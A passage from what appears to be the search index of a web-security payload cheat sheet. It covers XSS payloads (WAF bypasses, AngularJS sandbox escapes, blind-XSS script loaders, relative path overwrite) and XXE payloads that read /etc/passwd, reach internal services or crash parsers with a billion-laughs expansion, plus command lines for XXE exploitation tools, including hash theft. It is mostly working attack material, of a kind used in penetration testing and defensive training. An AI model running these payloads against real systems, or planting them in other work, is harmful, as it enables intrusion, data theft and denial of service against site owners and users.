12th September 2018","text":"<pre><code>&lt;a href=javas&amp;#99;ript:alert(1)&gt;\n</code></pre>"},{"location":"XSS%20Injection/#fortiweb-waf-bypass-by-rezaduty-9th-july-2019","title":"Fortiweb WAF Bypass by @rezaduty - 9th July 2019","text":"<pre><code>\\u003e\\u003c\\u0068\\u0031 onclick=alert('1')\\u003e\n</code></pre>"},{"location":"XSS%20Injection/#labs","title":"Labs","text":"<ul> <li>PortSwigger Labs for XSS</li> </ul>"},{"location":"XSS%20Injection/#references","title":"References","text":"<ul> <li>Unleashing-an-Ultimate-XSS-Polyglot</li> <li>tbm</li> <li>(Relative Path Overwrite) RPO XSS - Infinite Security</li> <li>RPO TheSpanner</li> <li>RPO Gadget - innerthmtl</li> <li>Relative Path Overwrite - Detectify</li> <li>XSS ghettoBypass - d3adend</li> <li>XSS without HTML: Client-Side Template Injection with AngularJS</li> <li>XSSING WEB PART - 2 - Rakesh Mane</li> <li>Making an XSS triggered by CSP bypass on Twitter. @tbmnull</li> <li>Ways to alert(document.domain) - @tomnomnom</li> <li>D1T1 - Michele Spagnuolo and Lukas Wilschelbaum - So We Broke All CSPs</li> <li>Sleeping stored Google XSS Awakens a $5000 Bounty by Patrik Fehrenbach</li> <li>RPO that lead to information leakage in Google by filedescriptor</li> <li>God-like XSS, Log-in, Log-out, Log-in in Uber by Jack Whitton</li> <li>Three Stored XSS in Facebook by Nirgoldshlager</li> <li>Using a Braun Shaver to Bypass XSS Audit and WAF by Frans Rosen</li> <li>An XSS on Facebook via PNGs &amp; Wonky Content Types by Jack Whitton</li> <li>Stored XSS in *.ebay.com by Jack Whitton</li> <li>Complicated, Best Report of Google XSS by Ramzes</li> <li>Tricky Html Injection and Possible XSS in sms-be-vip.twitter.com by secgeek</li> <li>Command Injection in Google Console by Venkat S</li> <li>Facebook's Moves - OAuth XSS by PAULOS YIBELO</li> <li>Stored XSS on developer.uber.com via admin account compromise in Uber by James Kettle (albinowax)</li> <li>Yahoo Mail stored XSS by Klikki Oy</li> <li>Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212) by Masato Kinugawa</li> <li>Youtube XSS by fransrosen</li> <li>Best Google XSS again - by Krzysztof Kotowicz</li> <li>IE &amp; Edge URL parsing Problem - by detectify</li> <li>Google XSS subdomain Clickjacking</li> <li>Microsoft XSS and Twitter XSS</li> <li>Flash XSS mega nz - by frans</li> <li>xss in google IE, Host Header Reflection</li> <li>Years ago Google xss</li> <li>xss in google by IE weird behavior</li> <li>xss in Yahoo Fantasy Sport</li> <li>xss in Yahoo Mail Again, worth $10000 by Klikki Oy</li> <li>Sleeping XSS in Google by securityguard</li> <li>Decoding a .htpasswd to earn a payload of money by securityguard</li> <li>Google Account Takeover</li> <li>AirBnb Bug Bounty: Turning Self-XSS into Good-XSS #2 by geekboy</li> <li>Uber Self XSS to Global XSS</li> <li>How I found a $5,000 Google Maps XSS (by fiddling with Protobuf) by Marin MoulinierFollow</li> <li>Airbnb \u2013 When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities by Brett</li> <li>XSSI, Client Side Brute Force</li> <li>postMessage XSS on a million sites - December 15, 2016 - Mathias Karlsson</li> <li>postMessage XSS Bypass</li> <li>XSS in Uber via Cookie by zhchbin</li> <li>Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP by frans</li> <li>XSS due to improper regex in third party js Uber 7k XSS</li> <li>XSS in TinyMCE 2.4.0 by Jelmer de Hen</li> <li>Pass uncoded URL in IE11 to cause XSS</li> <li>Twitter XSS by stopping redirection and javascript scheme by Sergey Bobrov</li> <li>Auth DOM Uber XSS</li> <li>XSS in www.yahoo.com</li> <li>Stored XSS, and SSRF in Google using the Dataset Publishing Language</li> <li>Stored XSS on Snapchat</li> <li>XSS cheat sheet - PortSwigger</li> <li>mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, J\u00f6rg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang</li> <li>Self Closing Script</li> <li>Bypass &lt; with \uff1c</li> <li>Bypassing Signature-Based XSS Filters: Modifying Script Code</li> </ul>"},{"location":"XSS%20Injection/XSS%20in%20Angular/","title":"XSS in Angular and AngularJS","text":""},{"location":"XSS%20Injection/XSS%20in%20Angular/#client-side-template-injection","title":"Client Side Template Injection","text":"<p>The following payloads are based on Client Side Template Injection.</p>"},{"location":"XSS%20Injection/XSS%20in%20Angular/#storedreflected-xss-simple-alert-in-angularjs","title":"Stored/Reflected XSS - Simple alert in AngularJS","text":"<p>AngularJS as of version 1.6 have removed the sandbox altogether</p> <p>AngularJS 1.6+ by Mario Heiderich</p> <pre><code>{{constructor.constructor('alert(1)')()}}\n</code></pre> <p>AngularJS 1.6+ by @brutelogic</p> <pre><code>{{[].pop.constructor&amp;#40'alert\\u00281\\u0029'&amp;#41&amp;#40&amp;#41}}\n</code></pre> <p>Example available at https://brutelogic.com.br/xss.php</p> <p>AngularJS 1.6.0 by @LewisArdern &amp; @garethheyes</p> <pre><code>{{0[a='constructor'][a]('alert(1)')()}}\n{{$eval.constructor('alert(1)')()}}\n{{$on.constructor('alert(1)')()}}\n</code></pre> <p>AngularJS 1.5.9 - 1.5.11 by Jan Horn</p> <pre><code>{{\nc=''.sub.call;b=''.sub.bind;a=''.sub.apply;\nc.$apply=$apply;c.$eval=b;op=$root.$$phase;\n$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;\nC=c.$apply(c);$root.$$phase=op;$root.$digest=od;\nB=C(b,c,b);$evalAsync(\"\n    astNode=pop();astNode.type='UnaryExpression';\n    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';\n    astNode.argument={type:'Identifier',name:'foo'};\n    \");\nm1=B($$asyncQueue.pop().expression,null,$root);\nm2=B(C,null,m1);[].push.apply=m2;a=''.sub;\n$eval('a(b.c)');[].push.apply=a;\n}}\n</code></pre> <p>AngularJS 1.5.0 - 1.5.8</p> <pre><code>{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}\n</code></pre> <p>AngularJS 1.4.0 - 1.4.9</p> <pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}\n</code></pre> <p>AngularJS 1.3.20</p> <pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}\n</code></pre> <p>AngularJS 1.3.19</p> <pre><code>{{\n'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;\n$eval('x=alert(1)//');\n}}\n</code></pre> <p>AngularJS 1.3.3 - 1.3.18</p> <pre><code>{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;\n'a'.constructor.prototype.charAt=[].join;\n$eval('x=alert(1)//');  }}\n</code></pre> <p>AngularJS 1.3.1 - 1.3.2</p> <pre><code>{{\n{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;\n'a'.constructor.prototype.charAt=''.valueOf;\n$eval('x=alert(1)//');\n}}\n</code></pre> <p>AngularJS 1.3.0</p> <pre><code>{{!ready &amp;&amp; (ready = true) &amp;&amp; (\n!call\n? $$watchers[0].get(toString.constructor.prototype)\n: (a = apply) &amp;&amp;\n(apply = constructor) &amp;&amp;\n(valueOf = call) &amp;&amp;\n(''+''.toString(\n'F = Function.prototype;' +\n'F.apply = F.a;' +\n'delete F.a;' +\n'delete F.valueOf;' +\n'alert(1);'\n))\n);}}\n</code></pre> <p>AngularJS 1.2.24 - 1.2.29</p> <pre><code>{{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\\\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\\\"'\");}}\n</code></pre> <p>AngularJS 1.2.19 - 1.2.23</p> <pre><code>{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor);}}\n</code></pre> <p>AngularJS 1.2.6 - 1.2.18</p> <pre><code>{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}\n</code></pre> <p>AngularJS 1.2.2 - 1.2.5</p> <pre><code>{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval(\"x='\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\"'\");}}\n</code></pre> <p>AngularJS 1.2.0 - 1.2.1</p> <pre><code>{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}\n</code></pre> <p>AngularJS 1.0.1 - 1.1.5 and Vue JS</p> <pre><code>{{constructor.constructor('alert(1)')()}}\n</code></pre>"},{"location":"XSS%20Injection/XSS%20in%20Angular/#advanced-bypassing-xss","title":"Advanced bypassing XSS","text":"<p>AngularJS (without <code>'</code> single and <code>\"</code> double quotes) by @Viren</p> <pre><code>{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}\n</code></pre> <p>AngularJS (without <code>'</code> single and <code>\"</code> double quotes and <code>constructor</code> string)</p> <pre><code>{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}\n</code></pre> <pre><code>{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}\n</code></pre> <pre><code>{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}\n</code></pre> <pre><code>{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}\n</code></pre> <p>AngularJS bypass Waf [Imperva]</p> <pre><code>{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\\\u{6f}mpt(d\\\\u{6f}cument.d\\\\u{6f}main)')()}}\n</code></pre>"},{"location":"XSS%20Injection/XSS%20in%20Angular/#blind-xss","title":"Blind XSS","text":"<p>1.0.1 - 1.1.5 &amp;&amp; &gt; 1.6.0 by Mario Heiderich (Cure53)</p> <pre><code>{{\nconstructor.constructor(\"var _ = document.createElement('script');\n    _.src='//localhost/m';\n    document.getElementsByTagName('body')[0].appendChild(_)\")()\n}}\n</code></pre> <p>Shorter 1.0.1 - 1.1.5 &amp;&amp; &gt; 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (PortSwigger)</p> <pre><code>{{\n$on.constructor(\"var _ = document.createElement('script');\n    _.src='//localhost/m';\n    document.getElementsByTagName('body')[0].appendChild(_)\")()\n}}\n</code></pre> <p>1.2.0 - 1.2.5 by Gareth Heyes (PortSwigger)</p> <pre><code>{{\na=\"a\"[\"constructor\"].prototype;a.charAt=a.trim;\n$eval('a\",eval(`var _=document\\\\x2ecreateElement(\\'script\\');\n    _\\\\x2esrc=\\'//localhost/m\\';\n    document\\\\x2ebody\\\\x2eappendChild(_);`),\"')\n}}\n</code></pre> <p>1.2.6 - 1.2.18 by Jan Horn (Cure53, now works at Google Project Zero)</p> <pre><code>{{\n(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval(\"\n        var _ = document.createElement(\\'script\\');\n        _.src=\\'//localhost/m\\';\n        document.getElementsByTagName(\\'body\\')[0].appendChild(_)\")')()\n}}\n</code></pre> <p>1.2.19 (FireFox) by Mathias Karlsson</p> <pre><code>{{\ntoString.constructor.prototype.toString=toString.constructor.prototype.call;\n[\"a\",'eval(\"var _ = document.createElement(\\'script\\');\n    _.src=\\'//localhost/m\\';\n    document.getElementsByTagName(\\'body\\')[0].appendChild(_)\")'].sort(toString.constructor);\n}}\n</code></pre> <p>1.2.20 - 1.2.29 by Gareth Heyes (PortSwigger)</p> <pre><code>{{\na=\"a\"[\"constructor\"].prototype;a.charAt=a.trim;\n$eval('a\",eval(`\n    var _=document\\\\x2ecreateElement(\\'script\\');\n    _\\\\x2esrc=\\'//localhost/m\\';\n    document\\\\x2ebody\\\\x2eappendChild(_);`),\"')\n}}\n</code></pre> <p>1.3.0 - 1.3.9 by Gareth Heyes (PortSwigger)</p> <pre><code>{{\na=toString().constructor.prototype;a.charAt=a.trim;\n$eval('a,eval(`\n    var _=document\\\\x2ecreateElement(\\'script\\');\n    _\\\\x2esrc=\\'//localhost/m\\';\n    document\\\\x2ebody\\\\x2eappendChild(_);`),a')\n}}\n</code></pre> <p>1.4.0 - 1.5.8 by Gareth Heyes (PortSwigger)</p> <pre><code>{{\na=toString().constructor.prototype;a.charAt=a.trim;\n$eval('a,eval(`var _=document.createElement(\\'script\\');\n    _.src=\\'//localhost/m\\';document.body.appendChild(_);`),a')\n}}\n</code></pre> <p>1.5.9 - 1.5.11 by Jan Horn (Cure53, now works at Google Project Zero)</p> <pre><code>{{\nc=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;\nc.$eval=b;op=$root.$$phase;\n$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;\nC=c.$apply(c);$root.$$phase=op;$root.$digest=od;\nB=C(b,c,b);$evalAsync(\"astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(`var _=document.createElement(\\\\'script\\\\');_.src=\\\\'//localhost/m\\\\';document.body.appendChild(_);`)))+';astNode.argument={type:'Identifier',name:'foo'};\");\nm1=B($$asyncQueue.pop().expression,null,$root);\nm2=B(C,null,m1);[].push.apply=m2;a=''.sub;\n$eval('a(b.c)');[].push.apply=a;\n}}\n</code></pre>"},{"location":"XSS%20Injection/XSS%20in%20Angular/#automatic-sanitization","title":"Automatic Sanitization","text":"<p>To systematically block XSS bugs, Angular treats all values as untrusted by default. When a value is inserted into the DOM from a template, via property, attribute, style, class binding, or interpolation, Angular sanitizes and escapes untrusted values.</p> <p>However, it is possible to mark a value as trusted and prevent the automatic sanitization with these methods:</p> <ul> <li>bypassSecurityTrustHtml</li> <li>bypassSecurityTrustScript</li> <li>bypassSecurityTrustStyle</li> <li>bypassSecurityTrustUrl</li> <li>bypassSecurityTrustResourceUrl</li> </ul> <p>Example of a component using the unsecure method <code>bypassSecurityTrustUrl</code>:</p> <pre><code>import { Component, OnInit } from '@angular/core';\n\n@Component({\n  selector: 'my-app',\n  template: `\n    &lt;h4&gt;An untrusted URL:&lt;/h4&gt;\n    &lt;p&gt;&lt;a class=\"e2e-dangerous-url\" [href]=\"dangerousUrl\"&gt;Click me&lt;/a&gt;&lt;/p&gt;\n    &lt;h4&gt;A trusted URL:&lt;/h4&gt;\n    &lt;p&gt;&lt;a class=\"e2e-trusted-url\" [href]=\"trustedUrl\"&gt;Click me&lt;/a&gt;&lt;/p&gt;\n  `,\n})\nexport class App {\n  constructor(private sanitizer: DomSanitizer) {\n    this.dangerousUrl = 'javascript:alert(\"Hi there\")';\n    this.trustedUrl = sanitizer.bypassSecurityTrustUrl(this.dangerousUrl);\n  }\n}\n</code></pre> <p></p> <p>When doing a code review, you want to make sure that no user input is being trusted since it will introduce a security vulnerability in the application.</p>"},{"location":"XSS%20Injection/XSS%20in%20Angular/#references","title":"References","text":"<ul> <li>XSS without HTML - CSTI with Angular JS - Portswigger</li> <li>Blind XSS AngularJS Payloads</li> <li>Angular Security</li> <li>Bypass DomSanitizer</li> </ul>"},{"location":"XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/","title":"XSS with Relative Path Overwrite - IE 8/9 and lower","text":"<p>You need these 3 components</p> <pre><code>1) stored XSS that allows CSS injection. : {}*{xss:expression(open(alert(1)))}\n2) URL Rewriting.\n3) Relative addressing to CSS style sheet : ../style.css\n</code></pre> <p>A little example</p> <pre><code>http://url.example.com/index.php/[RELATIVE_URL_INSERTED_HERE]\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\" /&gt;\n&lt;link href=\"[RELATIVE_URL_INSERTED_HERE]/styles.css\" rel=\"stylesheet\" type=\"text/css\" /&gt;\n&lt;/head&gt;\n&lt;body&gt;\nStored XSS with CSS injection - Hello {}*{xss:expression(open(alert(1)))}\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Explanation of the vulnerability</p> <p>The Meta element forces IE\u2019s document mode into IE7 compatible which is required to execute expressions. Our persistent text {}*{xss:expression(open(alert(1)))is included on the page and in a realistic scenario it would be a profile page or maybe a shared status update which is viewable by other users. We use \u201copen\u201d to prevent client side DoS with repeated executions of alert. A simple request of \u201crpo.php/\u201d makes the relative style load the page itself as a style sheet. The actual request is \u201c/labs/xss_horror_show/chapter7/rpo.php/styles.css\u201d the browser thinks there\u2019s another directory but the actual request is being sent to the document and that in essence is how an RPO attack works.</p> <p>Demo 1 at <code>http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo.php</code> Demo 2 at <code>http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo2.php/fakedirectory/fakedirectory2/fakedirectory3</code> MultiBrowser : <code>http://challenge.hackvertor.co.uk/xss_horror_show/chapter7/rpo3.php</code></p> <p>From : <code>http://www.thespanner.co.uk/2014/03/21/rpo/</code></p>"},{"location":"XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/#mutated-xss-for-browser-ie8ie9","title":"Mutated XSS for Browser IE8/IE9","text":"<pre><code>&lt;listing id=x&gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt;&lt;/listing&gt;\n&lt;script&gt;alert(document.getElementById('x').innerHTML)&lt;/script&gt;\n</code></pre> <p>IE will read and write (decode) HTML multiple time and attackers XSS payload will mutate and execute.</p>"},{"location":"XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/#references","title":"References","text":"<ul> <li>TODO</li> </ul>"},{"location":"XXE%20Injection/","title":"XML External Entity","text":"<p>An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.</p> <p>Internal Entity: If an entity is declared within a DTD it is called as internal entity.   Syntax: <code>&lt;!ENTITY entity_name \"entity_value\"&gt;</code></p> <p>External Entity: If an entity is declared outside a DTD it is called as external entity. Identified by <code>SYSTEM</code>.   Syntax: <code>&lt;!ENTITY entity_name SYSTEM \"entity_value\"&gt;</code></p>"},{"location":"XXE%20Injection/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Labs</li> <li>Detect the vulnerability</li> <li>Exploiting XXE to retrieve files</li> <li>Classic XXE</li> <li>Classic XXE Base64 encoded</li> <li>PHP Wrapper inside XXE</li> <li>XInclude attacks</li> <li>Exploiting XXE to perform SSRF attacks</li> <li>Exploiting XXE to perform a deny of service</li> <li>Billion Laugh Attack</li> <li>Yaml attack</li> <li>Parameters Laugh attack</li> <li>Exploiting Error Based XXE</li> <li>Exploiting blind XXE to exfiltrate data out-of-band</li> <li>Blind XXE</li> <li>XXE OOB Attack (Yunusov, 2013)</li> <li>XXE OOB with DTD and PHP filter</li> <li>XXE OOB with Apache Karaf</li> <li>WAF Bypasses</li> <li>Bypass via character encoding</li> <li>XXE in Java</li> <li>XXE in exotic files</li> <li>XXE inside SVG</li> <li>XXE inside SOAP</li> <li>XXE inside DOCX file</li> <li>XXE inside XLSX file</li> <li>XXE inside DTD file</li> <li>Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents</li> </ul>"},{"location":"XXE%20Injection/#tools","title":"Tools","text":"<ul> <li>xxeftp - A mini webserver with FTP support for XXE payloads   <pre><code>sudo ./xxeftp -uno 443\n./xxeftp -w -wps 5555\n</code></pre></li> <li>230-OOB - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via http://xxe.sh/ <pre><code>$ python3 230.py 2121\n</code></pre></li> <li>XXEinjector - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods   <pre><code># Enumerating /etc directory in HTTPS application:\nruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl\n# Enumerating /etc directory using gopher for OOB method:\nruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher\n# Second order exploitation:\nruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt\n# Bruteforcing files using HTTP out of band method and netdoc protocol:\nruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc\n# Enumerating using direct exploitation:\nruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK\n# Enumerating unfiltered ports:\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all\n# Stealing Windows hashes:\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes\n# Uploading files using Java jar:\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf\n# Executing system commands using PHP expect:\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls\n# Testing for XSLT injection:\nruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt\n# Log requests only:\nruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt\n</code></pre></li> <li>oxml_xxe - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)   <pre><code>ruby server.rb\n</code></pre></li> <li>docem - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc   <pre><code>./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx\n./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place\n./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place\n./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_file -kt -sx docx\n</code></pre></li> <li>otori - Toolbox intended to allow useful exploitation of XXE vulnerabilities.   <pre><code>python ./otori.py --clone --module \"G-XXE-Basic\" --singleuri \"file:///etc/passwd\" --module-options \"TEMPLATEFILE\" \"TARGETURL\" \"BASE64ENCODE\" \"DOCTYPE\" \"XMLTAG\" --outputbase \"./output-generic-solr\" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs \n</code></pre></li> </ul>"},{"location":"XXE%20Injection/#labs","title":"Labs","text":"<ul> <li>PortSwigger Labs for XXE</li> <li>Exploiting XXE using external entities to retrieve files</li> <li>Exploiting XXE to perform SSRF attacks</li> <li>Blind XXE with out-of-band interaction</li> <li>Blind XXE with out-of-band interaction via XML parameter entities</li> <li>Exploiting blind XXE to exfiltrate data using a malicious external DTD</li> <li>Exploiting blind XXE to retrieve data via error messages</li> <li>Exploiting XInclude to retrieve files</li> <li>Exploiting XXE via image file upload</li> <li>Exploiting XXE to retrieve data by repurposing a local DTD</li> </ul>"},{"location":"XXE%20Injection/#detect-the-vulnerability","title":"Detect the vulnerability","text":"<p>Basic entity test, when the XML parser parses the external entities the result should contain \"John\" in <code>firstName</code> and \"Doe\" in <code>lastName</code>. Entities are defined inside the <code>DOCTYPE</code> element.</p> <pre><code>&lt;!--?xml version=\"1.0\" ?--&gt;\n&lt;!DOCTYPE replace [&lt;!ENTITY example \"Doe\"&gt; ]&gt;\n &lt;userInfo&gt;\n&lt;firstName&gt;John&lt;/firstName&gt;\n&lt;lastName&gt;&amp;example;&lt;/lastName&gt;\n&lt;/userInfo&gt;\n</code></pre> <p>It might help to set the <code>Content-Type: application/xml</code> in the request when sending XML payload to the server.</p>"},{"location":"XXE%20Injection/#exploiting-xxe-to-retrieve-files","title":"Exploiting XXE to retrieve files","text":""},{"location":"XXE%20Injection/#classic-xxe","title":"Classic XXE","text":"<p>We try to display the content of the file <code>/etc/passwd</code> </p> <pre><code>&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE data [\n&lt;!ELEMENT data (#ANY)&gt;\n&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;data&gt;&amp;file;&lt;/data&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE foo [  \n  &lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE foo [  \n  &lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre> <p> <code>SYSTEM</code> and <code>PUBLIC</code> are almost synonym.</p> <pre><code>&lt;!ENTITY % xxe PUBLIC \"Random Text\" \"URL\"&gt;\n&lt;!ENTITY xxe PUBLIC \"Any TEXT\" \"URL\"&gt;\n</code></pre>"},{"location":"XXE%20Injection/#classic-xxe-base64-encoded","title":"Classic XXE Base64 encoded","text":"<pre><code>&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"&gt; %init; ]&gt;&lt;foo/&gt;\n</code></pre>"},{"location":"XXE%20Injection/#php-wrapper-inside-xxe","title":"PHP Wrapper inside XXE","text":"<pre><code>&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"&gt; ]&gt;\n&lt;contacts&gt;\n&lt;contact&gt;\n&lt;name&gt;Jean &amp;xxe; Dupont&lt;/name&gt;\n&lt;phone&gt;00 11 22 33 44&lt;/phone&gt;\n&lt;address&gt;42 rue du CTF&lt;/address&gt;\n&lt;zipcode&gt;75000&lt;/zipcode&gt;\n&lt;city&gt;Paris&lt;/city&gt;\n&lt;/contact&gt;\n&lt;/contacts&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=http://10.0.0.3\" &gt;\n]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre>"},{"location":"XXE%20Injection/#xinclude-attacks","title":"XInclude attacks","text":"<p>When you can't modify the DOCTYPE element use the XInclude to target </p> <pre><code>&lt;foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"&gt;\n&lt;xi:include parse=\"text\" href=\"file:///etc/passwd\"/&gt;&lt;/foo&gt;\n</code></pre>"},{"location":"XXE%20Injection/#exploiting-xxe-to-perform-ssrf-attacks","title":"Exploiting XXE to perform SSRF attacks","text":"<p>XXE can be combined with the SSRF vulnerability to target another service on the network.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY % xxe SYSTEM \"http://internal.service/secret_pass.txt\" &gt;\n]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre>"},{"location":"XXE%20Injection/#exploiting-xxe-to-perform-a-deny-of-service","title":"Exploiting XXE to perform a deny of service","text":"<p> : These attacks might kill the service or the server, do not use them on the production.</p>"},{"location":"XXE%20Injection/#billion-laugh-attack","title":"Billion Laugh Attack","text":"<pre><code>&lt;!DOCTYPE data [\n&lt;!ENTITY a0 \"dos\" &gt;\n&lt;!ENTITY a1 \"&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;\"&gt;\n&lt;!ENTITY a2 \"&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;\"&gt;\n&lt;!ENTITY a3 \"&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;\"&gt;\n&lt;!ENTITY a4 \"&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;\"&gt;\n]&gt;\n&lt;data&gt;&amp;a4;&lt;/data&gt;\n</code></pre>"},{"location":"XXE%20Injection/#yaml-attack","title":"Yaml attack","text":"<pre><code>a: &amp;a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\nb: &amp;b 